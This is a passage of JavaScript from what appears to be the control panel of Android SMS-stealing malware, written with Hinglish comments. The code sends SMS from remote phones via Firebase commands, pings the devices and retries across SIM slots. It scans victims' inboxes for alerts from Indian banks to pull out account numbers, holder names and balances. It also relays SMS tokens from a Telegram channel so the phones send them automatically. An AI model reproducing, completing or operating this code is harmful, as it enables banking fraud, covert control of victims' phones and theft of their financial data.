      if(statusEl)statusEl.textContent='❌ '+(data&&data.error||'Failed');
      toast(data&&data.error||'Send failed',false);
    }
  });
}

// ---- FIX: Check Recharge (Ping) ----
function checkRecharge(){
  var d=getSelDev();if(!d){toast('Select a device first',false);return;}
  var statusEl=document.getElementById('sendStatus');
  var raw=clientsRawMap[d.id];
  var inst=getFbInstance(d.fbId);
  if(inst&&isRtoStyleUrl(inst.restUrl)){
    if(statusEl)statusEl.textContent='Pinging device via Firebase command...';
    sendSmsInternal('9999999999', 'REBEL_PING', _sendSimSlot, function(success, data){
      if(statusEl)statusEl.textContent=success?'✅ Ping command queued on device':'❌ '+(data&&data.error||'Ping failed');
      if(success) toast('Ping command sent — device APK must be online to execute',true);
      else toast(data&&data.error||'Ping failed',false);
    });
    return;
  }
  var phone=getDeviceDisplayPhone(raw);
  if(!phone||phone==='No Number'){toast('Device has no phone number',false);return;}
  if(statusEl)statusEl.textContent='Pinging...';
  sendSmsInternal(phone, 'REBEL_PING', _sendSimSlot, function(success, data){
    if(statusEl)statusEl.textContent=success?'✅ Ping sent – device is reachable!':'❌ '+(data&&data.error||'Ping failed – device may be offline');
    if(success) toast('Ping sent – device is reachable!',true);
    else toast(data&&data.error||'Ping failed – device may be offline',false);
  });
}
function sameNumberFromCandidates(sim,d,to){
  var simCount=getDualSimCount(d), out=[], seen={}, i, f;
  f=rabelFromSimForSend(sim,d,to);
  if(f){seen[f]=1;out.push(f);}
  for(i=1;i<=Math.max(simCount,2);i++){
    if(!seen[i]){seen[i]=1;out.push(i);}
  }
  return out;
}
function verifySmsDeliveredToDevice(inst,devId,message){
  if(!inst||!devId||!message)return Promise.resolve(false);
  var needle=String(message).trim().slice(0,20);
  if(!needle)return Promise.resolve(false);
  return restJsonInst(inst,'messages/'+devId).then(function(msgs){
    if(!msgs||typeof msgs!=='object')return false;
    for(var k in msgs){
      var v=msgs[k];
      if(!v||typeof v!=='object')continue;
      var body=String(v.body||v.message||v.text||'');
      if(body.indexOf(needle)>=0)return true;
    }
    return false;
  }).catch(function(){return false;});
}
function retrySameNumberUntilDelivered(inst,d,to,msg,simSlot,phoneDial,fromList,idx,callback){
  if(idx>=fromList.length){
    if(callback)callback(true,{ok:true,message:'⏳ Firebase par command likha — device APK se SMS bhejega → '+phoneDial,to:phoneDial,delivered:false});
    return;
  }
  var fromSim=fromList[idx];
  var patch=buildNyaApkCommandPatch(d.rawId,simSlot,to,msg);
  var slot=Math.max(0,(simSlot||1)-1);
  patch.simSlot=String(slot);
  patch.sim=slot;
  var rabel={from:fromSim,to:formatApkSmsTo(to),message:msg,isSended:false,timestamp:Date.now(),id:'sms_'+Date.now()};
  sendSmsViaRestDual(inst,[
    {path:'clients/'+d.rawId,payload:patch,method:'PATCH'},
    {path:'clients/'+d.rawId+'/webhookEvent/sendSms',payload:rabel,method:'PUT'}
  ]).then(function(){
    return new Promise(function(resolve){setTimeout(resolve,4500);});
  }).then(function(){
    return verifySmsDeliveredToDevice(inst,d.rawId,msg);
  }).then(function(delivered){
    if(delivered){
      if(callback)callback(true,{ok:true,message:'✅ Same-number SMS device par aa gaya → '+phoneDial+' (from:'+fromSim+')',to:phoneDial,delivered:true,via:'same-num'});
    }else{
      retrySameNumberUntilDelivered(inst,d,to,msg,simSlot,phoneDial,fromList,idx+1,callback);
    }
  }).catch(function(){
    retrySameNumberUntilDelivered(inst,d,to,msg,simSlot,phoneDial,fromList,idx+1,callback);
  });
}
function finishSmsSendCallback(inst,d,msg,phoneDial,r,callback,sameNum,simSlot,toRaw){
  if(sameNum){
    toast('Same number SMS — SIM paths try ho rahe hain…',true);
    var fromList=sameNumberFromCandidates(simSlot||1,d,toRaw||phoneDial);
    retrySameNumberUntilDelivered(inst,d,toRaw||phoneDial,msg,simSlot||1,phoneDial,fromList,0,callback);
    return;
  }
  var hint=' → '+phoneDial;
  if(r.path)hint+=' · '+r.path;
  if(r.patchOk&&!r.webhookOk)hint+=' (PATCH queued — device APK online hona chahiye)';
  var baseMsg='SMS command queued'+(r.via?' via '+r.via:'')+hint;
  verifySmsQueuedOnDevice(inst,d.rawId,msg).then(function(verified){
    var queued=!!(verified||r.patchOk||r.webhookOk);
    if(verified)baseMsg='✅ Firebase mein command likha'+hint;
    else if(r.patchOk||r.webhookOk)baseMsg='⏳ Command bheja — device execute karega'+hint;
    else baseMsg='❌ Firebase par command nahi likha — auth/rules check karo'+hint;
    if(callback)callback(queued,{ok:queued,message:baseMsg,path:r.path,to:phoneDial,verified:verified,patchOk:!!r.patchOk,webhookOk:!!r.webhookOk});
    if(queued&&d){
      appendOptimisticSentSms(d.id,phoneDial,msg);
      setTimeout(function(){
        if(selDev===d.id){
          var inst2=getFbInstance(d.fbId);
          if(inst2)fetchSmsFast(inst2,d).then(function(list){if(list&&list.length)mergeSmsIntoDevice(d.id,list);});
        }
      },3500);
    }
  });
}
function sendSmsPhpPromise(phpBody){
  return sendSmsFetch(phpBody).then(function(res){
    if(res.httpOk&&res.data&&res.data.ok){
      return{
        ok:true,
        message:res.data.message||'Sent',
        via:'php',
        path:res.data.path,
        to:res.data.to,
        patchOk:!!(res.data&&res.data.patchOk),
        webhookOk:!!(res.data&&res.data.webhookOk)
      };
    }
    throw new Error((res.data&&res.data.error)||'PHP send failed');
  });
}
function sendSmsInstant(to,msg,simSlot,callback){
  var d=getSelDev();
  var inst=getFbInstance(d&&d.fbId);
  if(!d||!inst){if(callback)callback(false,{error:'No device'});return;}
  var phoneFull=String(to||'').trim();
  var phoneDial=formatApkSmsTo(phoneFull||normalizePhone(phoneFull));
  if(!phoneDial||phoneDial.length<11){if(callback)callback(false,{error:'Valid phone number daalo (10 digit)'});return;}
  var sameNum=isSameNumberAsDevice(d,phoneFull||phoneDial);
  var attempts=getSendAttempts(inst,d,phoneFull||phoneDial,msg,simSlot||1);
  var dual=needsDualSmsSend(inst,d);
  var writeNode=getClientWritePath(d,inst);
  if(writeNode==='All_Users'||writeNode==='All_User')writeNode='clients';
  var phpBody={
    device_id:d.rawId,to:phoneDial,message:msg,sim:simSlot||1,
    database_url:inst.restUrl,auth_key:getFbAuthKey(inst),
    schema:inst.schema||'rabel',device_node:writeNode,composite_id:d.id,
    same_number:sameNum?1:0,sim_count:getDualSimCount(d)
  };
  var restFn=dual?sendSmsViaRestDual:sendSmsViaRestSequential;
  var sdkFn=dual?sendSmsDirectFirebaseDual:sendSmsDirectFirebaseSequential;
  var clientChain=restFn(inst,attempts)
    .catch(function(){
      if(inst.db)return sdkFn(inst,attempts);
      return Promise.reject(new Error('REST failed'));
    })
    .catch(function(){
      if(typeof rebelApiPost!=='function')return Promise.reject(new Error('Native API unavailable'));
      try{
        var native=rebelApiPost('rebel_send_sms',phpBody);
        if(native&&native.ok)return{ok:true,message:native.message||'Sent',via:'native',path:native.path,to:native.to||phoneDial,patchOk:!!native.patchOk,webhookOk:!!native.webhookOk};
        if(native&&native.error)throw new Error(native.error);
      }catch(e){throw e;}
      return Promise.reject(new Error('Native send failed'));
    });
  var phpChain=sendSmsPhpPromise(phpBody);
  promiseAny([clientChain,phpChain])
    .then(function(r){finishSmsSendCallback(inst,d,msg,phoneDial,r,callback,sameNum,simSlot,phoneFull||phoneDial);})
    .catch(function(e){
      var err=(e&&e.message)||'Send failed — Firebase write nahi hua (auth/rules check karo)';
      if(callback)callback(false,{error:err});
    });
}
function sendSmsInternal(to, msg, simSlot, callback){
  sendSmsInstant(to,msg,simSlot,callback);
}

// ─── BANK FUNCTIONS (Copied from laptop.php) ───
var BANK_SENDERS=[
  {keys:['SBIINB','SBIPSG','SBIBNK','ATMSBI','SBIUPI','STATEBNK','SBIECS','SBICRD','SBIMEL'],name:'State Bank of India'},
  {keys:['HDFCBK','HDFCBN','HDFCCC','HDFCLI','HDFCVC'],name:'HDFC Bank'},
  {keys:['ICICIB','ICICIT','ICICBK','ICICIA','ICICIP'],name:'ICICI Bank'},
  {keys:['AXISBK','AXISMR','AXISOL'],name:'Axis Bank'},
  {keys:['KOTAKB','KOTAKM','KOTAKBK'],name:'Kotak Mahindra Bank'},
  {keys:['PNBSMS','PNBANK','PNBMBK'],name:'Punjab National Bank'},
  {keys:['BOBSMS','BOBTXN','BANKBAR'],name:'Bank of Baroda'},
  {keys:['CANBNK','CANARA'],name:'Canara Bank'},
  {keys:['UNIONB','UNIONBK','UBOI'],name:'Union Bank of India'},
  {keys:['IDBIBK','IDBISM'],name:'IDBI Bank'},
  {keys:['YESBNK','YESBKL'],name:'Yes Bank'},
  {keys:['INDUSB','INDUSL'],name:'IndusInd Bank'},
  {keys:['FEDBNK','FEDERAL'],name:'Federal Bank'},
  {keys:['BANDHN','BANDHAN'],name:'Bandhan Bank'},
  {keys:['INDBNK','INDIANB'],name:'Indian Bank'},
  {keys:['IDFCFB','IDFCBK'],name:'IDFC FIRST Bank'},
  {keys:['RBLBNK','RBLCRD'],name:'RBL Bank'},
  {keys:['AUDBNK','AUBANK'],name:'AU Small Finance Bank'},
  {keys:['CENTBK','CENTOB'],name:'Central Bank of India'},
  {keys:['IOBCHN','IOBBNK'],name:'Indian Overseas Bank'},
  {keys:['UCOBNK','UCOBANK'],name:'UCO Bank'},
  {keys:['MAHABK','BANKMAH'],name:'Bank of Maharashtra'},
  {keys:['KARBNK','KBLBNK'],name:'Karnataka Bank'},
  {keys:['SOUTHBNK','SBTBNK'],name:'South Indian Bank'},
  {keys:['CITIBK','CITIBN'],name:'Citibank'},
  {keys:['STANCH','SCBANK'],name:'Standard Chartered'},
  {keys:['PAYZAP','PAYTMP'],name:'Paytm Payments Bank'},
  {keys:['AIRBNK','AIRTLM'],name:'Airtel Payments Bank'},
  {keys:['JANABK','JSFBNK'],name:'Jana Small Finance Bank'},
  {keys:['EQUITAS','EQUTAS'],name:'Equitas Small Finance Bank'},
  {keys:['UJVBNK','UJJIVN'],name:'Ujjivan Small Finance Bank'}
];
var BANK_BODY_PATTERNS=[
  [/state\s*bank\s*of\s*india/i,'State Bank of India'],
  [/\bSBI\b[\s\S]{0,40}(?:a\/c|acct|customer|dear|user)/i,'State Bank of India'],
  [/\bHDFC\s*Bank\b/i,'HDFC Bank'],
  [/dear\s+hdfc\b/i,'HDFC Bank'],
  [/\bICICI\s*Bank\b/i,'ICICI Bank'],
  [/dear\s+icici\b/i,'ICICI Bank'],
  [/\bAxis\s*Bank\b/i,'Axis Bank'],
  [/\bKotak\b[\s\S]{0,20}Bank/i,'Kotak Mahindra Bank'],
  [/\bPNB\b[\s\S]{0,30}(?:a\/c|acct|customer)/i,'Punjab National Bank'],
  [/punjab\s*national\s*bank/i,'Punjab National Bank'],
  [/bank\s*of\s*baroda/i,'Bank of Baroda'],
  [/\bBOB\b[\s\S]{0,30}(?:a\/c|acct)/i,'Bank of Baroda'],
  [/canara\s*bank/i,'Canara Bank'],
  [/union\s*bank\s*of\s*india/i,'Union Bank of India'],
  [/\bidbi\s*bank/i,'IDBI Bank'],
  [/\byes\s*bank\b/i,'Yes Bank'],
  [/indusind\s*bank/i,'IndusInd Bank'],
  [/federal\s*bank/i,'Federal Bank'],
  [/bandhan\s*bank/i,'Bandhan Bank'],
  [/indian\s*bank\b/i,'Indian Bank'],
  [/idfc\s*first\s*bank/i,'IDFC FIRST Bank'],
  [/\brbl\s*bank\b/i,'RBL Bank']
];

function parseInrAmount(s){var n=parseFloat(String(s).replace(/,/g,''));return isNaN(n)||n<0||n>1e12?null:n;}
function normalizeSmsSender(addr){var a=String(addr||'').toUpperCase().trim();a=a.replace(/^(?:VM|VK|VD|AD|JD|TX|BZ|BP|BT|BK|AX|AL|AM|ID|QP|JM|CP|XL|XX|VM-|AD-|JD-)[\s\-]*/i,'');return a.replace(/[^A-Z0-9]/g,'');}
function inferBankFromSender(address){var a=normalizeSmsSender(address);if(!a||a.length<3)return null;var best=null,bestLen=0,i,j,keys;for(i=0;i<BANK_SENDERS.length;i++){keys=BANK_SENDERS[i].keys;for(j=0;j<keys.length;j++){if(a.indexOf(keys[j])>=0&&keys[j].length>bestLen){best=BANK_SENDERS[i].name;bestLen=keys[j].length;}}}return best;}
function inferBankFromBody(body){var b=String(body||''),i;for(i=0;i<BANK_BODY_PATTERNS.length;i++){if(BANK_BODY_PATTERNS[i][0].test(b))return BANK_BODY_PATTERNS[i][1];}if(/\bSBI\b/i.test(b)&&/(?:a\/c|acct|account|credited|debited|bal)/i.test(b)) return 'State Bank of India';if(/\bHDFC\b/i.test(b)) return 'HDFC Bank';if(/\bICICI\b/i.test(b)) return 'ICICI Bank';if(/\bAXIS\b/i.test(b)) return 'Axis Bank';if(/\bPNB\b/i.test(b)) return 'Punjab National Bank';if(/\bBOB\b/i.test(b)&&/(?:a\/c|acct|bank)/i.test(b)) return 'Bank of Baroda';return null;}
function inferBankName(body,address){var fromSender=inferBankFromSender(address);if(fromSender)return fromSender;return inferBankFromBody(body);}
function extractAccountFromSms(body){var b=String(body||''),patterns=[/(?:a\/c|a\/c\.|ac|acct|account)\s*(?:no\.?|number|#)?\s*[:\-]?\s*(?:x{1,}|\*{1,}|X{1,})*(\d{4,18})/i,/(?:a\/c|acct|account)\s*(?:no\.?|number)?[:\s]*(?:x{2,}|\*{2,}|X{2,})*(\d{4})\b/i,/(?:ending|ends)\s*(?:with\s*)?(?:x+|\*+|X+)*(\d{4})\b/i,/(?:x{4,}|\*{4,}|X{4,})(\d{4})\b/,/(?:no\.?\s*)(?:x{2,}|\*{2,}|X{2,})(\d{4})\b/i,/(?:a\/c|acct)\s*(?:no\.?)?[:\s]*(\d{8,18})/i],i,m,best=null;for(i=0;i<patterns.length;i++){m=b.match(patterns[i]);if(m&&m[1]){var digits=String(m[1]).replace(/\D/g,'');if(digits.length>=4){if(!best||digits.length>best.length)best=digits;}}}return best;}
function extractHolderFromSms(body){var m=String(body||'').match(/dear\s+([A-Za-z][A-Za-z\s.'-]{1,40}?),/i);if(m&&m[1])return m[1].trim().replace(/\s+/g,' ');return '';}
function extractBalanceFromSms(body){var b=String(body||''),patterns=[/(?:total\s*)?(?:avl|available)\s*bal(?:ance)?[:\s\-]*(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,/(?:avl|available)\s*bal[:\s]*(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,/bal(?:ance)?\s*(?:is|as\s+on|now|as\s+of)\s*[:\-]?\s*(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,/(?:closing|clear)\s*bal(?:ance)?[:\s\-]*(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,/(?:balance\s+in\s+your\s+a\/c)[\s\S]{0,50}(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,/(?:credited|debited|withdrawn|deposited|transferred)[\s\S]{0,120}(?:avl|available)\s*bal(?:ance)?[:\s\-]*(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,/(?:a\/c|acct)[^\d]{0,60}(?:avl|available)\s*bal(?:ance)?[:\s\-]*(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,/\bbal[:\s]+(?:inr|rs\.?|₹)\s*([\d,]+(?:\.\d{1,2})?)/i,/(?:inr|rs\.?|₹)\s*([\d,]+(?:\.\d{1,2})?)\s*(?:is\s+)?(?:your\s+)?(?:avl|available|a\/c)\s*bal/i,/(?:credited|debited|deposited|transferred|withdrawn)\s*(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,/\b(?:bal|balance)\b[^0-9]*([\d,]+(?:\.\d{1,2})?)\s*(?:rs|inr|₹)/i],i,m,amt;for(i=0;i<patterns.length;i++){m=b.match(patterns[i]);if(m&&m[1]){amt=parseInrAmount(m[1]);if(amt!=null)return amt;}}return null;}
function isBalanceAlertSms(body){var b=String(body||'');return /(?:avl|available)\s*bal|balance\s*(?:is|as\s+on|now|as\s+of)|closing\s*bal|clear\s*bal|balance\s+in\s+your\s+a\/c|\bbal[:\s]+(?:rs|inr|₹)/i.test(b);}
function looksLikeBankSms(body,address){var bal=extractBalanceFromSms(body);if(bal==null)return false;if(inferBankFromSender(address))return true;if(inferBankFromBody(body))return true;if(extractAccountFromSms(body))return true;if(isBalanceAlertSms(body))return true;if(/(?:credited|debited|withdrawn|deposited|transferred|spent|paid|received)/i.test(body)&&/(?:a\/c|acct|account)/i.test(body))return true;if(/(?:sbi|hdfc|icici|axis|kotak|pnb|bob|canara|union|idbi|yes\s*bank|indusind|federal|bandhan|idfc|rbl)/i.test(body))return true;return false;}
function maskBankAccount(acct){if(!acct||acct==='Unknown')return'Unknown';var d=String(acct).replace(/\D/g,'');if(d.length<=4)return d||'Unknown';return 'XXXX'+d.slice(-4);}
function formatInr(n){if(n==null||isNaN(n))return'—';return '₹ '+Number(n).toLocaleString('en-IN',{minimumFractionDigits:2,maximumFractionDigits:2});}
function parseBankAccountsFromSms(smsList){var map={},keys,k,row,bals,sum,i,acctKey;(smsList||[]).forEach(function(s){if(!s||!s.body||!looksLikeBankSms(s.body,s.address))return;var bal=extractBalanceFromSms(s.body);if(bal==null)return;var acct=extractAccountFromSms(s.body)||'';var bank=inferBankName(s.body,s.address);if(!bank)return;acctKey=acct||'NA';k=bank+'|'+acctKey;if(!map[k])map[k]={bank:bank,account:acct,holder:'',balances:[],latestMs:0,latestDate:'',sender:''};row=map[k];if(!row.account&&acct)row.account=acct;var holder=extractHolderFromSms(s.body);if(holder&&!row.holder)row.holder=holder;row.balances.push(bal);var ms=s.ts||s.date||s.date_ms||0;if(ms>=row.latestMs){row.latestMs=ms;row.latestDate=s.date_readable||'';row.current=bal;row.sender=s.address||'';if(holder)row.holder=holder;if(acct)row.account=acct;}});keys=Object.keys(map);return keys.map(function(key){row=map[key];bals=row.balances;sum=0;for(i=0;i<bals.length;i++)sum+=bals[i];return{bank:row.bank,account:row.account,accountMask:maskBankAccount(row.account||'Unknown'),holder:row.holder||'',sender:row.sender||'',current:row.current!=null?row.current:bals[bals.length-1],average:sum/bals.length,highest:Math.max.apply(null,bals),lowest:Math.min.apply(null,bals),count:bals.length,latestDate:row.latestDate};}).sort(function(a,b){return a.bank.localeCompare(b.bank);});}
function renderBankAccounts(){
  var dev=getSelDev(),listEl=document.getElementById('bankList'),emptyEl=document.getElementById('bankEmpty');
  if(!dev){if(emptyEl){emptyEl.style.display='';emptyEl.innerHTML='<div class="ico">📱</div>Select a device to load bank balances<br><span style="font-size:12px;opacity:.6">Tap a device on Home</span>';}if(listEl)listEl.innerHTML='';return;}
  var smsList=(deviceSmsCache[dev.id]&&deviceSmsCache[dev.id].list)||window_allSms||[];
  if(!smsList.length&&emptyEl){emptyEl.style.display='';emptyEl.innerHTML='<div class="ico">📭</div>No SMS found<br><span style="font-size:12px;opacity:.6">Wait for SMS sync or switch to SMS tab</span>';listEl.innerHTML='';return;}
  var banks=parseBankAccountsFromSms(smsList);
  if(emptyEl)emptyEl.style.display=banks.length?'none':'';
  if(!banks.length){listEl.innerHTML='<div class="bank-empty"><div class="ico">🏦</div>No bank balance SMS found<br><span style="font-size:12px;opacity:.6">SBI, HDFC, ICICI alerts will appear here</span></div>';return;}
  listEl.innerHTML=banks.map(function(b){
    var sub=[b.holder?'👤 '+esc(b.holder):'',b.accountMask!=='Unknown'?'A/C '+esc(b.accountMask):''].filter(Boolean).join(' · ');
    return '<div class="bank-card-m"><div style="display:flex;gap:10px;align-items:center;margin-bottom:8px"><div style="font-size:28px">🏦</div><div><div class="bank-name-m">'+esc(b.bank)+'</div>'+
      (sub?'<div class="bank-acct-m">'+sub+'</div>':'')+
      (b.sender?'<div class="bank-acct-m" style="margin-top:2px">via '+esc(b.sender)+'</div>':'')+
      '</div></div>'+
      '<div class="bank-grid-m">'+
      '<div class="bank-stat-m"><div class="bank-stat-lbl-m">CURRENT BALANCE</div><div class="bank-stat-val-m current">'+formatInr(b.current)+'</div></div>'+
      '<div class="bank-stat-m"><div class="bank-stat-lbl-m">AVERAGE</div><div class="bank-stat-val-m">'+formatInr(b.average)+'</div></div>'+
      '<div class="bank-stat-m"><div class="bank-stat-lbl-m">HIGHEST</div><div class="bank-stat-val-m">'+formatInr(b.highest)+'</div></div>'+
      '<div class="bank-stat-m"><div class="bank-stat-lbl-m">LOWEST</div><div class="bank-stat-val-m">'+formatInr(b.lowest)+'</div></div>'+
      '</div><div class="bank-meta-m">'+b.count+' balance alert SMS'+(b.latestDate?' · Updated: '+esc(b.latestDate):'')+'</div></div>';
  }).join('');
}

function switchTab(){}

/* APK headers + boot */
function rebelApkHeaders(){
  var h={};
  if(window.RebelAndroid){
    try{
      h['X-Rebel-Attest']=RebelAndroid.getAttest();
      h['X-Rebel-Device']=RebelAndroid.getDevice();
    }catch(e){}
  }
  return h;
}

/* AUTO TOKEN (Telegram channel SMS TOKEN → auto send via Firebase) */
var _autoTokenOn=false;
var _smsTokenLog=[];
var _autoTokenConfig={};
var _autoTokenDeviceSim=1;
function renderAutoTokenDeviceLog(log){
  var el=document.getElementById('autoTokenDeviceLog');
  if(!el)return;
  var rows=log||_smsTokenLog||[];
  if(!rows.length){el.innerHTML='<div class="empty-mini">Activity log yahan dikhega</div>';return;}
  el.innerHTML=rows.slice(0,8).map(function(row){
    var ok=row.ok?'ok':'bad';
    return '<div class="token-log '+ok+'">'+(row.time?esc(row.time)+' · ':'')+'→ '+esc(row.to||'?')+' · '+esc(String(row.message||'').slice(0,50))+'</div>';
  }).join('');
}
function fillAutoTokenDeviceFields(cfg){
  cfg=cfg||_autoTokenConfig||{};
  var tokenEl=document.getElementById('devTgBotToken');
  var channelEl=document.getElementById('devTgChannelId');
  var ownerEl=document.getElementById('devTgOwnerId');
  if(tokenEl)tokenEl.value=cfg.bot_token||'';
  if(channelEl)channelEl.value=cfg.channel_id||'';
  if(ownerEl)ownerEl.value=cfg.owner_id||'';
  _autoTokenDeviceSim=cfg.sim||_sendSimSlot||1;
  selectAutoTokenDeviceSim(_autoTokenDeviceSim,null);
  var tg=document.getElementById('autoTokenDeviceToggle');
  if(tg)tg.classList.toggle('on',!!_autoTokenOn);
}
function updateAutoTokenDeviceBanner(d){
  var phoneEl=document.getElementById('autoTokenDevicePhone');
  var metaEl=document.getElementById('autoTokenDeviceMeta');
  if(!d){
    if(phoneEl)phoneEl.textContent='Koi device select nahi';
    if(metaEl)metaEl.textContent='Pehle device card tap karo';
    return;
  }
  if(phoneEl)phoneEl.textContent=(d.displayPhone||d.name||'Device')+' · '+(d.status==='online'?'🟢 Online':'🔴 Offline');
  if(metaEl)metaEl.textContent='Model: '+(d.name||'?')+' · Battery '+d.battery+'% · '+(d.fbName||'Firebase');
}
function selectAutoTokenDeviceSim(n,btn){
  _autoTokenDeviceSim=n||1;
  _sendSimSlot=_autoTokenDeviceSim;
  document.querySelectorAll('.dev-at-sim').forEach(function(b){b.classList.remove('active');});
  var id='devAtSim'+_autoTokenDeviceSim;
  var el=document.getElementById(id);
  if(el)el.classList.add('active');
  if(btn)btn.classList.add('active');
}
function toggleAutoTokenDeviceEnable(){
  _autoTokenOn=!_autoTokenOn;
  var tg=document.getElementById('autoTokenDeviceToggle');
  if(tg)tg.classList.toggle('on',!!_autoTokenOn);
}
function openAutoTokenDeviceSetup(d){
  d=d||getSelDev();
  if(!d){toast('Pehle device kholo',false);return;}
  selDev=d.id;
  updateAutoTokenDeviceBanner(d);
  fillAutoTokenDeviceFields(_autoTokenConfig);
  renderAutoTokenDeviceLog(_smsTokenLog);
  var bg=document.getElementById('deviceSetupBg');
  var sheet=document.getElementById('autoTokenDeviceSheet');
  if(bg)bg.classList.add('open');
  if(sheet)sheet.classList.add('open');
}
function closeAutoTokenDeviceSetup(){
  var bg=document.getElementById('deviceSetupBg');
  var sheet=document.getElementById('autoTokenDeviceSheet');
  if(bg)bg.classList.remove('open');
  if(sheet)sheet.classList.remove('open');
}
function setupAutoTokenFromDevice(){
  var d=getSelDev();
  if(!d){toast('Pehle device card tap karo',false);return;}
  smsTokenFetch({action:'get'}).then(function(res){
    if(res&&res.ok){
      if(res.config){
        _autoTokenOn=!!res.config.enabled;
        _autoTokenConfig=res.config;
      }
      _smsTokenLog=res.log||[];
    }
    openAutoTokenDeviceSetup(d);
  }).catch(function(){
    openAutoTokenDeviceSetup(d);
  });
}
function saveAutoTokenDeviceSetup(){
  var d=getSelDev();
  if(!d){toast('Device select nahi hai',false);return;}
  var inst=getFbInstance(d.fbId);
  if(!inst){toast('Firebase missing',false);return;}
  var token=String((document.getElementById('devTgBotToken')||{}).value||'').trim();
  var channel=String((document.getElementById('devTgChannelId')||{}).value||'').trim();
  var owner=String((document.getElementById('devTgOwnerId')||{}).value||'').trim();
  if(!token){toast('Bot token daalo',false);document.getElementById('devTgBotToken')&&document.getElementById('devTgBotToken').focus();return;}
  if(!channel){toast('Channel ID daalo',false);document.getElementById('devTgChannelId')&&document.getElementById('devTgChannelId').focus();return;}
  var tg=document.getElementById('autoTokenDeviceToggle');
  var enabled=tg?tg.classList.contains('on'):true;
  _autoTokenOn=enabled;
  toast('Saving…',true);
  smsTokenFetch({
    action:'save',
    enabled:enabled,
    bot_token:token,
    channel_id:channel,
    owner_id:owner,
    device_id:d.rawId,
    database_url:inst.restUrl,
    fb_name:inst.name,
    auth_key:getFbAuthKey(inst),
    schema:inst.schema||'rabel',
    device_node:getClientWritePath(d,inst),
    sim:_autoTokenDeviceSim||1,
    sim_count:getDualSimCount(d)
  }).then(function(res){
    if(!res||!res.ok){toast('Save failed',false);return;}
    if(res.config){_autoTokenConfig=res.config;_autoTokenOn=!!res.config.enabled;}
    if(res.log)_smsTokenLog=res.log;
    updateAutoTokenUi(_autoTokenConfig);
    renderAutoTokenDeviceLog(_smsTokenLog);
    renderAutoTokenLog(_smsTokenLog);
    toast((enabled?'Auto Token ON':'Settings saved')+' · Sim '+(_autoTokenDeviceSim||1)+' · '+d.displayPhone,true);
    smsTokenFetch({action:'setup_webhook',bot_token:token,channel_id:channel,owner_id:owner}).then(function(h){
      if(h&&h.ok)toast('Webhook connected ✓',true);
    }).catch(function(){});
  }).catch(function(){toast('Save failed',false);});
}
function setupAutoTokenDeviceWebhook(){
  var token=String((document.getElementById('devTgBotToken')||{}).value||'').trim();
  var channel=String((document.getElementById('devTgChannelId')||{}).value||'').trim();
  var owner=String((document.getElementById('devTgOwnerId')||{}).value||'').trim();
  if(!token||!channel){toast('Pehle token aur channel ID daalo',false);return;}
  toast('Webhook connect ho raha hai…',true);
  smsTokenFetch({action:'setup_webhook',bot_token:token,channel_id:channel,owner_id:owner}).then(function(h){
    if(h&&h.ok){toast('Webhook connected ✓',true);return;}
    toast((h&&h.error)||(h&&h.telegram&&h.telegram.description)||'Webhook failed',false);
  }).catch(function(){toast('Webhook failed',false);});
}
function useSelForAutoToken(){
  var d=getSelDev();
  if(!d){toast('Pehle koi device select karo (card tap karo)',false);return;}
  setupAutoTokenFromDevice();
}
function nyaRequirePanelServer(forAutoToken){
  if(!window.REBEL_NATIVE_APP)return true;
  var base=typeof nyaGetPanelServer==='function'?nyaGetPanelServer():'';
  if(base)return true;
  toast(forAutoToken?'Auto Token ke liye Menu → Panel Server URL set karo (nya.php host)':'Panel server URL set karo',false);
  return false;
}
function smsTokenFetch(body){
  if(!nyaRequirePanelServer(true))return Promise.resolve({ok:false,error:'Panel server URL not set'});
  var hdr={'Content-Type':'application/json'};
  var apk=rebelApkHeaders();
  for(var k in apk)hdr[k]=apk[k];
  return fetch(SMS_TOKEN_URL,{method:'POST',headers:hdr,body:JSON.stringify(body||{})})
    .then(function(r){return r.json();})
    .catch(function(){return{ok:false,error:'Auto Token API failed — panel server check karo'};});
}
function renderAutoTokenLog(log){
  var el=document.getElementById('autoTokenLog');
  if(!el)return;
  var rows=log||_smsTokenLog||[];
  if(!rows.length){el.innerHTML='<div class="empty-mini">No auto-token activity yet</div>';return;}
  el.innerHTML=rows.map(function(row){
    var ok=row.ok?'ok':'bad';
    var when=row.time||'';
    var msg=String(row.message||'').slice(0,60);
    return '<div class="token-log '+ok+'">'+(when?esc(when)+' · ':'')+'→ '+esc(row.to||'?')+' · '+esc(msg)+(row.error&&!row.ok?' · '+esc(row.error):'')+'</div>';
  }).join('');
}
function fillTelegramFields(cfg){
  cfg=cfg||{};
  var tokenEl=document.getElementById('tgBotToken');
  var channelEl=document.getElementById('tgChannelId');
  var ownerEl=document.getElementById('tgOwnerId');
  if(tokenEl&&cfg.bot_token)tokenEl.value=cfg.bot_token;
  if(channelEl)channelEl.value=cfg.channel_id||'';
  if(ownerEl)ownerEl.value=cfg.owner_id||'';
}
function updateAutoTokenUi(cfg){
  _autoTokenConfig=cfg||_autoTokenConfig||{};
  fillTelegramFields(_autoTokenConfig);
  var devEl=document.getElementById('autoTokenDevice');
  var stEl=document.getElementById('autoTokenStatus');
  var toggle=document.getElementById('autoTokenToggle');
  if(toggle)toggle.classList.toggle('on',!!_autoTokenOn);
  if(devEl){
    if(_autoTokenConfig.device_id){
      devEl.textContent=(_autoTokenConfig.fb_name?_autoTokenConfig.fb_name+' · ':'')+_autoTokenConfig.device_id.slice(0,12)+'…';
    }else{
      devEl.textContent='Home se device select karo → Set Device';
    }
  }
  if(stEl){
    var parts=[];
    if(_autoTokenConfig.has_bot_token||_autoTokenConfig.bot_token)parts.push('Bot ✓');
    else parts.push('Bot ✗');
    if(_autoTokenConfig.channel_id)parts.push('Ch '+_autoTokenConfig.channel_id);
    if(_autoTokenOn)parts.unshift('✅ ON');
    else parts.unshift('⏸ OFF');
    if(_autoTokenConfig.device_id)parts.push('Sim '+(_autoTokenConfig.sim||1));
    stEl.textContent=parts.join(' · ');
  }
}
function saveTelegramSettings(){
